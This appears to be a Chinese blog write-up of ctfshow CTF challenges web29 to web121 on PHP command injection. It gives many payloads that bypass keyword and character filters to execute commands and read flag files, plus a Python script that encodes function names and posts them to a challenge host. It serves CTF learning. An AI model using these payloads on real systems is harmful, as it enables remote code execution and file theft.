---
uuid: 0c09439a-4d92-6c93-9ffb-80834afe73f0
title: ctfshow命令执行
date: 2022-03-15 21:16:59
tags: 
     - 命令执行
categories: 
     - [Web]
     - [CTF]
---

ctfshow的命令执行

![image-20220713124728656](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131247725.png?x-oss-process=hzy)<!--more-->

# web29

![image-20220315211906358](https://img-blog.csdnimg.cn/img_convert/8d4caca041a9a3e6f36bcb24a44c01bc.png)代码审计，eval函数的作用就是让输入的字符串当作php代码进行执行，get输参c系统命令，ls列目录![image-20220315212034460](https://img-blog.csdnimg.cn/img_convert/f9eef2b8a13da728e57a1ae848c4d0e0.png)

这代码里面对flag进行了过滤，可以用*或？进行绕过

![image-20220315212224001](https://img-blog.csdnimg.cn/img_convert/21dd9210d8c7102aab8c9e674a385429.png)

```
?c=system("ls");
?c=system("tac%20fla*.php");
```

# web30

![image-20220315212735626](https://img-blog.csdnimg.cn/img_convert/49b66b3c31b185d0b8e26f26db1e2a1d.png)

发现flag，system，php这些字样都被过滤，那么就不能用系统命令来执行，但是据了解，php还支持一个执行运算符，就是反引号`,php会把反引号里面的内容当作shell命令去执行，从而替代了系统命令。echo函数的作用是输出一个或多个字符串，这里需要说一声，在执行命令的时候，这个反引号里面的内容并不是直接当成标准输出，而是当成一个变量进行输出。

![image-20220315213907240](https://img-blog.csdnimg.cn/img_convert/06f51e4eece82d0efef543c9933e9daa.png)

```
?c=echo`ls`;
？c=echo`tac fla*.p*p;
```

然后后面的考察点和上一题一样

![image-20220315213952047](https://img-blog.csdnimg.cn/img_convert/da9fe7cdf661be82de8cfcf0994552e9.png)

# web31

![image-20220315214138088](https://img-blog.csdnimg.cn/img_convert/fb238b0e6b75938e1f61bea264afd8a1.png)

这个题过滤的更多，flag,system,php,cat,sort,shell，还过滤了空格，可以用`%09（代替空格）`绕过![image-20220315214648820](https://img-blog.csdnimg.cn/img_convert/9ef47f66aebceed4902232f6101d4945.png)

```
?c=echo`ls%09`;
?c=echo`tac%09fla*`;
```

![image-20220315214934150](https://img-blog.csdnimg.cn/img_convert/53678cc1d4e257af099b2f03920f63e2.png)

# web32

![image-20220316195346562](https://img-blog.csdnimg.cn/img_convert/2a4a3f816ac361ad4466f8a5bdc68d5b.png)

这道题又增加了对echo的过滤，经查询发现php中不用括号的有echo以及include等等![image-20220316195725337](https://img-blog.csdnimg.cn/img_convert/8121e27f07570fe8cbf8f4f5371abdf3.png)

![image-20220316200346650](https://img-blog.csdnimg.cn/img_convert/0d6c3811cd18c24b0b556dc240c61e62.png)

这里学习到用`?>`可以代替`;`

所以这道题有两种解法，一种是利用文件包含的rce，

```
?c=include$_GET[0]?>&0=data://text/plain,<?php phpinfo();?>
```

![image-20220316200646145](https://img-blog.csdnimg.cn/img_convert/c8e15331b86308b52f65a31d9ec45030.png)

或者利用php伪协议来读取php文件

```
?c=include$_GET[0]?>&0=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20220316200947406](https://img-blog.csdnimg.cn/img_convert/49300138b436c24095669283c1d12638.png)

![image-20220316200955434](https://img-blog.csdnimg.cn/img_convert/4704aa829762fd30f3e4da0b9809bb64.png)

# web33

这道题和上道题相比多了个括号过滤，逃逸文件包含用不到括号所以解题思路跟上题一样

# web34

过滤时多过滤了一个=和一个<，解题思路跟上题一样

# web35

过滤时多过滤了一个=和一个<，解题思路跟上题一样

# web36

![image-20220316202435082](https://img-blog.csdnimg.cn/img_convert/99948dc67e4db5ae36d1208366c34424.png)

这道题跟上面的也是一样，只不过因为又过滤了数字，所以把0改成字母就可！

# web37

![image-20220316202701784](https://img-blog.csdnimg.cn/img_convert/f353f8310f2cd8d12c9a1bda85e2ed5b.png)

这道题没有过滤太多东西，就过滤了个flag

```
/?c=data://text/plain,<?php system("tac fla?.php");?>
/?c=data:text/plain,<?=system("tac fla*");?>
```

上面两种绕过方式就是举例，这道题的绕过方式很多。

![image-20220316203257934](https://img-blog.csdnimg.cn/img_convert/f2fa7873ccd0a8162a365ff3711d5fdf.png)

# web38

![image-20220316203532744](https://img-blog.csdnimg.cn/img_convert/0f723d6cb99d899ad22d605e5590a019.png)

发现过滤了flag，php，file，文件包含漏洞，输出flag

考虑到使用data协议，这道题因为过滤了php，所以要使用短标签

对于正常标签就是`<?php`，而短标签就是`<?`

```
/?c=data://text/plain,<?=system("ls");
```

![image-20220316203905163](https://img-blog.csdnimg.cn/img_convert/94e1f6a736c2e939cee8bb2716144f58.png)

```
/?c=data://text/plain,<?=system("tac fla*.p*p");
```

![image-20220316204110876](https://img-blog.csdnimg.cn/img_convert/db9d1e5814df930c26041aa1306c1b64.png)

这道题也可以直接

```
?c=data://text/plain,<?= system("cat fla*");?>
```

同样可以得到flag!

# web39

![image-20220316204532318](https://img-blog.csdnimg.cn/img_convert/013e131d271ecbc26bb2e6c7b1b658c6.png)

下面这是官方给的hint![image-20220316204558730](https://img-blog.csdnimg.cn/img_convert/e2e15d9ecaed7a149f3723250963d984.png)

这个跟上题解法一样

```
?c=data://text/plain,<?= system("cat fla*");?>
```

然后查看源代码得到flag

![image-20220316204659428](https://img-blog.csdnimg.cn/img_convert/9f9c1ee912a6e33521449880760432e0.png)

# web40

![image-20220316204834861](https://img-blog.csdnimg.cn/img_convert/ded4dd0594ed3aef1caa638d79bb8577.png)

这道题过滤了很多字符，利用get_defined_vars()

```bash
？c=eval(end(current(get_defined_vars())));&a=system("ls");
```

![image-20220316205101652](https://img-blog.csdnimg.cn/img_convert/f145f16b6d07a8189eeb8d3aed9cdcdf.png)

tac得到flag![image-20220316205117877](https://img-blog.csdnimg.cn/img_convert/c1c5ea5790bdcc9977aead8aa41e9983.png)

# web41

![image-20220316205218255](https://img-blog.csdnimg.cn/img_convert/e6e863fd38a2f236f8c5aef23db89cb6.png)

这道题把数字和字母都过滤了，写个脚本

```
import re
import requests

url="http://2a2e4b71-f1ff-4953-8b14-bd26f6633fdc.challenge.ctf.show/"

a=[]
ans1=""
ans2=""
for i in range(0,256):
    c=chr(i)
    tmp = re.match(r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-',c, re.I)
    if(tmp):
        continue
        #print(tmp.group(0))
    else:
        a.append(i)

# eval("echo($c);");
mya="system"  #函数名 这里修改！
myb="ls"      #参数
def myfun(k,my):
    global ans1
    global ans2
    for i in range (0,len(a)):
        for j in range(i,len(a)):
            if(a[i]|a[j]==ord(my[k])):
                ans1+=chr(a[i])
                ans2+=chr(a[j])
                return;
for k in range(0,len(mya)):
    myfun(k,mya)
data1="(\""+ans1+"\"|\""+ans2+"\")"
ans1=""
ans2=""
for k in range(0,len(myb)):
    myfun(k,myb)
data2="(\""+ans1+"\"|\""+ans2+"\")"

data={"c":data1+data2}
r=requests.post(url=url,data=data)
print(r.text)
```

![image-20220316212021042](https://img-blog.csdnimg.cn/img_convert/e03443bffc2b93a354cd9245bc3fd6e5.png)

cat一下就出来了！

![image-20220316212108446](https://img-blog.csdnimg.cn/img_convert/6349b7a1f7a464508d3d6902eed68e23.png)

# web42

![image-20220316213345412](https://img-blog.csdnimg.cn/img_convert/8f82c6e1adcc17bc9c23946b2289cf92.png)

在给变量c赋值的语句下面的语句`”>/dev/null 2>&1“` ，可以将其理解成将输入的数写入黑洞，也就是说只要执行一个命令都无效

> \>/dev/null   意思就是把错误输出到“黑洞” 

>/dev/null 2>&1 默认情况是1，也就是等同于1>/dev/null 2>&1。意思就是把标准输出重定向到“黑洞”，还把错误输出2重定向到标准输出1，也就是标准输出和错误输出都进了“黑洞”

所以可以`?c=ls&&ls`,这里需要强调一下，需要先url编码之后再执行

![image-20220316213603124](https://img-blog.csdnimg.cn/img_convert/8a196f16d56c47526e577a1b591d9434.png)

![image-20220316213710142](https://img-blog.csdnimg.cn/img_convert/c36e511882adc6f9cf919e8de3096d92.png)

![image-20220316213616093](https://img-blog.csdnimg.cn/img_convert/732f656ec3c69795aa2d18f620928af9.png)

# web43

![image-20220316214137648](https://img-blog.csdnimg.cn/img_convert/d40e7e6a684090e483c65cf7424df03e.png)

过滤了`cat`和`；`，cat可以用tac代替，；可以用%0a代替

```
tac flag.php%0a
```

![image-20220316214354134](https://img-blog.csdnimg.cn/img_convert/69c8f7ae9e18b03dab3c1681f220fe38.png)

# web44

![image-20220317193356268](https://img-blog.csdnimg.cn/img_convert/a27e5dbd54acf589fb1e7d8a9b6e8c8d.png)

过滤了flag以及cat，system‘函数将输入的参数的后面还是写入了黑洞，解决办法就是双写

| 2>/dev/null       | 意思就是把错误输出到“黑洞”                                   |
| ----------------- | ------------------------------------------------------------ |
| >/dev/null 2>&1   | 默认情况是1，也就是等同于1>/dev/null 2>&1。意思就是把标准输出重定向到“黑洞”，还把错误输出2重定向到标准输出1，也就是标准输出和错误输出都进了“黑洞” |
| -2>&1 >/dev/null- | -意思就是把错误输出2重定向到标准出书1，也就是屏幕，标准输出进了“黑洞”，也就是标准输出进了黑洞，错误输出打印到屏幕- |

所以还是先跟上一题一样`?c=ls&&ls`,这里要求先进行url编码之后再执行![image-20220317193902380](https://img-blog.csdnimg.cn/img_convert/8e690f1dee034b6a292b16962ec575ef.png)

![image-20220317193933690](https://img-blog.csdnimg.cn/img_convert/50bf35aa71f32d8b8898abbf1af5b715.png)

但是因为已经过滤了cat，所以用tac！！![image-20220317194121118](https://img-blog.csdnimg.cn/img_convert/dd428aac1fe3a23e2472ad64f8ed63eb.png)

# web45

![image-20220317194219994](https://img-blog.csdnimg.cn/img_convert/91f8fd096dc761d316e04082ab96a44e.png)

一如既往，这道题过滤了;，cat，flag还有空格，同时又写入黑洞，用上一题的方法依旧可以回显[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jhIDgLIA-1648814972961)(https://gitee.com/hzy2003628/drawing-bed/raw/master/images/20220317194335.png)]

但是读取的时候原来的方法不再出现回显![image-20220317194518987](https://img-blog.csdnimg.cn/img_convert/f7bd2666d0005d17de0d3f0e111d55ad.png)

> &&代表执行两个命令，让后面的命令进入黑洞，以便于能够正常执行前面的命令，这道题因为过滤了空格，所以用tab制表符代替空格，%09就是tab制表符的url编码

![image-20220317194848055](https://img-blog.csdnimg.cn/img_convert/8fa5886555606cf662702a5e6722af0f.png)

# web46

![image-20220317194929182](https://img-blog.csdnimg.cn/img_convert/1b08bff107b4ce047fd26c352cf7c205.png)

过滤了；，cat，flag，数字，*，$

发现上一题的payload照样可以用![image-20220317195114914](https://img-blog.csdnimg.cn/img_convert/5ae537cf15579a2f84cf69fb9fd71ad6.png)

![image-20220317195144560](https://img-blog.csdnimg.cn/img_convert/628c7be0f568e24c4a54e05eb1231e31.png)

# web47

![image-20220317195227814](https://img-blog.csdnimg.cn/img_convert/e9606c89cf607497ad0976a8fdc90ec3.png)

过滤了一些字符，但是貌似用不到这些字符，用同样的方法依然可以解决！

![image-20220317195319376](https://img-blog.csdnimg.cn/img_convert/1992209a89547ec71e3b0ee4f80bdd4c.png)

![image-20220317195343908](https://img-blog.csdnimg.cn/img_convert/a309c7c5cd0f9fd56d45e46744296d2f.png)

学习一下新知识，这道题还可以`nl<fla''g.php||`

 nl查看源代码，<代替空格，''分割flag过滤，||解决命令黑洞

# web48

![image-20220317195458944](https://img-blog.csdnimg.cn/img_convert/1d011403823db103cb19838b649010ad.png)

![image-20220317195609287](https://img-blog.csdnimg.cn/img_convert/76717f7b23234c9fc27b2ce603d37d8a.png)

![image-20220317195633101](https://img-blog.csdnimg.cn/img_convert/bc75834146a1b66907eb58bb143ac163.png)

过滤的字符对这种绕过方法不受影响，所以前面的解法依然适用！

# web49

![image-20220317195746781](https://img-blog.csdnimg.cn/img_convert/2ca73d8666b25961bed13bb3860ebba1.png)

解法同上！

当然下面的官方给的hint方法也可以![image-20220317200009855](https://img-blog.csdnimg.cn/img_convert/bf746cf44b25e105991a9c19ac641211.png)

# web50

![image-20220317200050967](https://img-blog.csdnimg.cn/img_convert/9bb8438157b0435779cf1cf2ab96249f.png)

这道题不能用前面的方法来解决了，因为过滤了%

这个时候就需要使用其他过滤方法绕过，上面有一题提到了一种其他解法，`/?c=ls<p||`,盲猜这题应该也是又php文件，所以ls所有带p的![image-20220317200735399](https://img-blog.csdnimg.cn/img_convert/5abdeaf597ff8bb7db2028c6f0d4502c.png)

> `nl`命令在linux系统中用来计算文件中行号。`nl`可以将输出的文件内容自动的加上行号。
> `<` 表示的是输入重定向的意思，就是把`<`后面跟的文件取代键盘作为新的输入设备。
> 所以可以使用`<`或者`<>`绕过空格，使用`\`插入到flag中

然后`/?c=nl<fla\g.php||`![image-20220317201124402](https://img-blog.csdnimg.cn/img_convert/5f10d7d33ae9060c1a33a7236533a6c3.png)

# web51

![image-20220317201208986](https://img-blog.csdnimg.cn/img_convert/ba46845acd31cdeec872d5664e317d63.png)

这道题把tac也过滤了！

这里可以输上题的payload，但是回显是1,考虑到1就是正确，查看源代码即可得到flag！![image-20220317201856660](https://img-blog.csdnimg.cn/img_convert/06e907ef1bfc6ba521add1cfe22228e4.png)

我用的tac的payload，因为过滤了tac所以可以在tac中间插入`\`

`/?c=ta\c<fla\g.php||`

![image-20220317201524099](https://img-blog.csdnimg.cn/img_convert/c129dd048e9c81d3efbe53607d39a776.png)

# web52

![image-20220317201932533](https://img-blog.csdnimg.cn/img_convert/dd661f49ac6f648145dab2ded1127624.png)

这道题把<>也过滤了

> 那么使用`${IFS}`绕过空格。
>
> 关于IFS的解释：
> Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。
>
> 而 IFS 是一种 set 变量，当 shell 处理"命令替换"和"参数替换"时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。

```ruby
/?c=ta\c${IFS}fla\g.php||
```

但是发现不在这里，又进行逐层寻找，最终找到flag

![image-20220317202637315](https://img-blog.csdnimg.cn/img_convert/56321b27a3256ee45732febdc2dd92f5.png)

tac一下得到flag！这里不要忘记过滤了flag还有tac都需要插入\来进行过滤！![image-20220317202754220](https://img-blog.csdnimg.cn/img_convert/334a02535152d1c348789b8ec10d3dae.png)

# web53

![image-20220317202834683](https://img-blog.csdnimg.cn/img_convert/266449a3160df2e9231aa4296bdf66ef.png)

这道题不再有黑洞了，不用绕黑洞了！上题的payload这题照样适用，把绕黑洞的去掉就可！

> /?c=nl${IFS}fla\g.php

![image-20220317203157699](https://img-blog.csdnimg.cn/img_convert/88f707429c7cf2cbb15aa7e0420e48fc.png)

> /?c=ta\c${IFS}fla\g.php

![image-20220317203250780](https://img-blog.csdnimg.cn/img_convert/c87c68d0f939c9698471b2cf598bae4f.png)

# web54

![image-20220317203610103](https://img-blog.csdnimg.cn/img_convert/14db4709ceefeac3acf24a054f30ccbe.png)

可以使用`mv`命令：
`mv`命令用来为文件或目录改名、或将文件或目录移入其它位置。



```ruby
/?c=mv${IFS}fl?g.php${IFS}a.txt
```

然后flag.php就改名为a.txt，然后直接访问就可得到flag！

、![image-20220317203859480](https://img-blog.csdnimg.cn/img_convert/e837bd3b08b454d24535a7c6106360c1.png)

# web55

![image-20220317203934001](https://img-blog.csdnimg.cn/img_convert/653d377c2685bb62476c10de14885d8b.png)

这个过滤了所有的字母

```ruby
/?c=/???/????64 ????.???                     //也就是?c=/bin/base64 flag.php
```

> 通过匹配bin下存在的命令进行读取flag。
> bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。
> 我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls

![image-20220317204237757](https://img-blog.csdnimg.cn/img_convert/e679879b1ff44565794c5d7cd390f6f5.png)

解码得到flag！![image-20220317204255791](https://img-blog.csdnimg.cn/img_convert/4bd5ac966929899e17bbcc5d947542f8.png)

# web56

![image-20220317204357217](https://img-blog.csdnimg.cn/img_convert/50103b39becb5108db93629fa923e5ff.png)

还是过滤了所有的字母！

抓包后西显示如下

![image-20220317205344974](https://img-blog.csdnimg.cn/img_convert/aec14bda1c19a17cd006cd8c533b6f22.png)

构造poc执行命令

`?c=.+/???/????????[@-[]`
注：后面的`[@-[]`是linux下面的匹配符，是进行匹配的大写字母。
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/fc24d532365665aa4feb4eb5f68c148a.png)

在这个之前我们需要构造一个post上传文件的数据包。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

![image-20220317210103212](https://img-blog.csdnimg.cn/img_convert/5d0a189864b60fed0efa71988d1409f5.png)

然后抓包![image-20220317210115562](https://img-blog.csdnimg.cn/img_convert/d42c31629e42fd43a2f4a2f25dd8226a.png)

暂时没有找到解决办法！

# web57

![image-20220317210950317](https://img-blog.csdnimg.cn/img_convert/6b8776aa23c748db493c184e3d4be008.png)

里面有个提示flag就在36.php里，

已知



```bash
┌──(amateur㉿kali)-[~]
└─$ echo $((~$(()))) 
-1                                                   
┌──(amateur㉿kali)-[~]
└─$ echo $((~$(($((~$(())))+$((~$(())))))))            
1                                                     
┌──(amateur㉿kali)-[~]
└─$ echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))
2
```

所以访问36.php只需要将里面的元素复制到36个，编写python脚本生成，上传得到flag

------

python脚本：



```python
s1 = "$((~$(("
s2 = ""
lils2 = "$((~$(())))"
s3 = "))))"

for i in range(37):
    s2 += lils2

print(s1+s2+s3)
```

输出：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))

![image-20220317211444172](https://img-blog.csdnimg.cn/img_convert/72f1c7418e57fbdada323e88285b038e.png)

验证：



```bash
┌──(amateur㉿kali)-[~]
└─$ echo $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
36
```

payload:



```html
url/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$(
```

![image-20220317211458425](https://img-blog.csdnimg.cn/img_convert/4d22375dd918b57496cbfbb62cb67bf5.png)

# web58

![image-20220317211629048](https://img-blog.csdnimg.cn/img_convert/3bd1f453a9d5183f4d55d8e8e3dbd3b3.png)

这道题需要post传参，可以通过高亮显示php文件

> show_source("flag.php");
>
> highlight_file("flag.php");

![image-20220318195111259](https://img-blog.csdnimg.cn/img_convert/2fc6218b093af94356ed838c3e372f56.png)

# web59

![image-20220318195323992](https://img-blog.csdnimg.cn/img_convert/c8d2a1daaed8bec50ddbd9adf5d0162f.png)

同上

![image-20220318195407992](https://img-blog.csdnimg.cn/img_convert/4c90c89d4f3d3079ea8bad38709d37e6.png)

# web60

同上

# web61

同上

# web62

同上

# web63

同上

# web64

同上

# web65

同上

# web66

![image-20220318203443507](https://img-blog.csdnimg.cn/img_convert/76c815f08701622f596759331e47ecd6.png)

![image-20220318203454310](https://img-blog.csdnimg.cn/img_convert/054185bcccae5f0defef01157dec1069.png)

用show_source()，回显该函数被禁用，查看根目录下的文件

> c=print_r(scandir("/"));

![image-20220318203633187](https://img-blog.csdnimg.cn/img_convert/5b0d5dd6dfe31edc22b64a79ef58a82c.png)

查看根目录下的文件

> c=highlight_file("/flag.txt");

![image-20220318203848272](https://img-blog.csdnimg.cn/img_convert/5e94c9dfaf9a07b3191f0e4eb0e49c9c.png)

# web67

![image-20220318203950563](https://img-blog.csdnimg.cn/img_convert/e2b7f26f5921e05120d5a4197901f7c3.png)

print_r()被禁用
查看根目录下有哪些文件：
用这个代替

> c=var_dump(scandir("/"));
> c=highlight_file('/flag.txt');

![image-20220318204102115](https://img-blog.csdnimg.cn/img_convert/be4fd951a134dc00c982738fbde2091a.png)

![image-20220318204113038](https://img-blog.csdnimg.cn/img_convert/4a4acb5886244e40474a83879c2cd8f1.png)

# web68

![image-20220318204235651](https://img-blog.csdnimg.cn/img_convert/e3f774709ae8a2243dff4c068873e64e.png)

> show_source()和highlight_file()被禁用
> POST：c=include('/flag.txt');
>
> 

![image-20220318204300791](https://img-blog.csdnimg.cn/img_convert/70ef3e3fda43e91f7f2275952faf4c3d.png)

# web69

![image-20220318204417825](https://img-blog.csdnimg.cn/img_convert/6f048ca90e09254b78c34c7a7741759b.png)

查看根目录下的文件：
但是print_r()、var_dump()被禁用

用下面的代替

> POST：c=var_export(scandir("/"));
> POST：c=include('/flag.txt');

![image-20220318204444663](https://img-blog.csdnimg.cn/img_convert/e663c6b507e0a343544bcb2dd802e7e4.png)

![image-20220318204515211](https://img-blog.csdnimg.cn/img_convert/a996766710b49bfae606eb2b1ba5acbe.png)

# web70

![image-20220318204627454](https://img-blog.csdnimg.cn/img_convert/acb483b1f3f37291c965033191501557.png)

> 尝试使用c=include('index.php');但是不行，盲猜应该还是在/flag.txt里面

所以c=include('/flag.txt');

![image-20220318205146853](https://img-blog.csdnimg.cn/img_convert/a9dfc25fbb0a5ba364f3a67093d9df47.png)

# web71

![image-20220318205409118](https://img-blog.csdnimg.cn/img_convert/6015524a3fe88b2c954082daf3553b8c.png)

用include函数不行了

![image-20220318205432162](https://img-blog.csdnimg.cn/img_convert/fa2ae470957587e4a9611309e6cb7194.png)

可以在后面加个exit函数，让匹配到缓冲区不执行就退出![image-20220318205601796](https://img-blog.csdnimg.cn/img_convert/20f0caf391d64ca60f4f3103c1cd1fe8.png)

# web72

![image-20220318205707478](https://img-blog.csdnimg.cn/img_convert/c39ec250811ba3d866df27a24cbc1141.png)

先看一下源码

![image-20220318205822789](https://img-blog.csdnimg.cn/img_convert/12d227c3b092ad8f72d93c15a486fb96.png)

这题对我来说有点难度，看了网上的wp。

先查询flag的位置

```
c=?><?php $a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
}
exit(0);
?>
```

![image-20220318210222426](https://img-blog.csdnimg.cn/img_convert/1c605aab28c910dc8e0799ec49c1a2fb.png)

这题未解出。。。。。。

# web73

![image-20220318210902325](https://img-blog.csdnimg.cn/img_convert/21e7c0597a5254179e290e8670ccab68.png)

先读取目录

```php
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();
```

![image-20220318210924758](https://img-blog.csdnimg.cn/img_convert/3f3b157799a2116e53bff1760452f2e8.png)

看到flag，直接include

```
c=include('/flagc.txt');exit();
```

![image-20220318211013551](https://img-blog.csdnimg.cn/img_convert/ea56db07ae06f83ea7ae49e8ed5b9ea8.png)

# web74

![image-20220318211111209](https://img-blog.csdnimg.cn/img_convert/be4a4792f1a48368bee1e0a2f2344b6a.png)

还是先读取根目录内容

![image-20220318211136513](https://img-blog.csdnimg.cn/img_convert/0f07e5b9ab6d8d819382ad3cd501069a.png)

找到flag，试试直接include

![image-20220318211304920](https://img-blog.csdnimg.cn/img_convert/f90b2f91d02e22798bfe35cf3d1fa78c.png)

# web75

![image-20220318211339908](https://img-blog.csdnimg.cn/img_convert/f2e0182aa68f82533797092c06687766.png)

解法同上

![image-20220318211407598](https://img-blog.csdnimg.cn/img_convert/156418e3d2b56ee39063d2d29080869f.png)

貌似不是同上，因为include函数有不行了，可以使用一些可使用的进程去读flag，这里使用PDO(PHP Database Object)去执行sql语句进而读取flag，payload：

```
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e-
>getMessage();exit(0);}exit(0);
```

![image-20220318211722798](https://img-blog.csdnimg.cn/img_convert/1791fd00da46e2c2aeb6fa8a107d6ce3.png)

# web76

![image-20220318211840950](https://img-blog.csdnimg.cn/img_convert/68d5c8bf612d1cd0f2c9044044f7e8ff.png)

列目录

![image-20220318211911599](https://img-blog.csdnimg.cn/img_convert/03dc546172d9bbaf705c49ff21b08546.png)

![image-20220318211929195](https://img-blog.csdnimg.cn/img_convert/e9f9c2ca536763457aa0635918841805.png)

解法和上题一样！

# web77

![image-20220318212041971](https://img-blog.csdnimg.cn/img_convert/edf38190e01516589ccf3a866f545041.png)

还是先读目录

![image-20220318212111711](https://img-blog.csdnimg.cn/img_convert/06ee2156502e80c951bfc0566c405009.png)

还是常使用POD读取flag36x.php但是失败了，根据提示使用PHP7.4以上才有的FFI进行命令执行，所以再构造

> ```php
> $ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
> $a='/readflag > 1.txt';//没有回显的
> $ffi->system($a);//通过$ffi去调用system函数
> ```

```php
c=$ffi = FFI::cdef("int system(const char *command);");
$a='/readflag > 1.txt';
$ffi->system($a);
```

![image-20220318212249549](https://img-blog.csdnimg.cn/img_convert/cbe4994ff0d2f2145df7a75689d5947a.png)

readflag是专门用来读flag的。
然后访问`/1.txt`即可。

![image-20220318212314783](https://img-blog.csdnimg.cn/img_convert/94a2df6aca7604f681b7d2de45831f69.png)

# web118

![image-20220318212434056](https://img-blog.csdnimg.cn/img_convert/fa18aff689783dce7c5bcc30c4d18141.png)

难得的新界面！查看一下源代码

![image-20220318212454255](https://img-blog.csdnimg.cn/img_convert/dfcb952d92a0feff6f61ae03b125ba3d.png)

> system($code);  这就是说明我们可以执行命令,但是有些指令是被ban的

```
利用系统变量构造nl命令
${PATH:~A}${PWD:~A}$IFS????.???
```

![image-20220713121341725](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131213810.png?x-oss-process=hzy)

# web119

跟上题一样的界面,又多了过滤的东西,上面的payload也被ban了

```
${SHLVL}       //一般是一个个位数
${#SHLVL}     //1，表示结果的字符长度
${PWD:${#}:${#SHLVL}}       //表示/
${USER}        //www-data
${PHP_VERSION:~A}       //2
${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}}         //at
```

payload如下

```
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.???
```

```
/???/?at ????.???
```

![image-20220713122441821](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131224890.png?x-oss-process=hzy)

# web120

题目如下

```

<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){   //  限制长度
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

测试发现过滤了PATH,采用shell的base64加密

> base64路径在/bin/base64,用?匹配的时候需要匹配全路径,不能只匹配base64

payload(由于用了随机函数，可能要多试几次)

```
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
```

![image-20220713123133000](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131231077.png?x-oss-process=hzy)

# web121

题目如下

```

<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

又过滤了SHLVL,可以用#?来代替,payload如下

```
${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???  // /bin/base64 flag.php
```

![image-20220713123721471](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207131237551.png?x-oss-process=hzy)

# web122

题目如下

```
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
